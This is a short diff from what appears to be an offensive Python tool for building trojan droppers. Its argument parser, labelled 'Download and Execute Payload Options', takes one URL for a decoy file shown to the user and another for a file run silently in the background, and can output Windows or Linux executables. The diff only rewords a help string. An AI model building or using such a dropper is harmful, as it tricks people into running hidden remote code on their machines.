@@ -4,7 +4,7 @@ WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/S
 def get_arguments():
 		parser = argparse.ArgumentParser(description='Download and Execute Payload Options')
 		parser.add_argument("-d", "--download", dest="show_file",help="Direct URL of the file which will be shown to the user", required=True)
-		parser.add_argument("-b", "--background", dest="background_file",help="Direct URL of the file which will be run in the background", required=True)
+		parser.add_argument("-b", "--background", dest="background_file",help="Direct URL of the file to be run in background", required=True)
 		parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
 		parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
 		parser.add_argument("-o", "--out", dest="out", help="Output file name (add .py at the end of file)", required=True)
